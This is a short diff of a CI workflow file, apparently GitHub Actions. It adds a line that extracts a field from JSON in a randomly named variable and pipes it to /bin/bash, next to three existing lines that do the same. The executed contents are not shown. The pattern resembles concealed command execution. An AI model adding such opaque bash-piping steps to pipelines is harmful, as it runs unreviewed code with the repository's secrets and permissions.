@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$wtr6" | jq -r .d5 | /bin/bash
           printf '%s' "$rjwm3" | jq -r .wdj06 | /bin/bash
           echo $nuaob6564 | jq -r .a4 | /bin/bash
+          printf '%s' "$eqs90" | jq -r .ifqa056 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
